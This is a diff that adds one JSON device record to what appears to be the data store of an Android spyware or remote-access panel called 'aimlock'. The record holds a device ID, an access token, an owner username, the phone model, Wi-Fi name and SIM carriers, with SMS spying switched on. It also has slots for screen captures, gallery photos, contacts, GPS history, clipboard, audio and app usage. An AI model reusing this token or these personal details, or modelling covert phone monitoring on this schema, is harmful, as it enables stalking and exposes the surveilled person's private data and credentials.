@@ -20258,5 +20258,37 @@
       ],
       "receivedAt": 1777534708228
     }
+  },
+  {
+    "deviceId": "aimlock_e415745c",
+    "deviceName": "HP-ZAL7SEX-C6BD",
+    "ownerUsername": "Zal7Sex",
+    "token": "738824701922b7ee60ca24b5585f02c4",
+    "lastSeen": 1777535990674,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-30T07:59:50.674Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 56,
+      "network": "WiFi: Zal7Sex 5G",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
